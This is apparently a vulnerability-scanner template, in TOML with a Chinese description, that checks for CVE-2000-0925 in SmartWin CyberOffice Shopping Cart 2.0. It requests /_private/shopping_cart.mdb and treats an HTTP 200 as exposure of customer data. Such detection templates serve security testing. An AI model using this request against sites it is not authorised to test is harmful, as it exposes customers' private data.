[info]
author = "ave"
description = "验证目标站点的 _private 目录是否存在世界可读权限，通过尝试访问该目录下的 shopping_cart.mdb 文件检测敏感客户数据泄露漏洞"
id = "POC-AVE-2000-0678"
name = "SmartWin CyberOffice Shopping Cart 2.0 客户端敏感信息泄露 PoC"
severity = "medium"
tags = ["ave-2000-0678"]
vuln_id = [
    "CVE-2000-0925",
    "AVE-2000-0678",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_private/shopping_cart.mdb"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
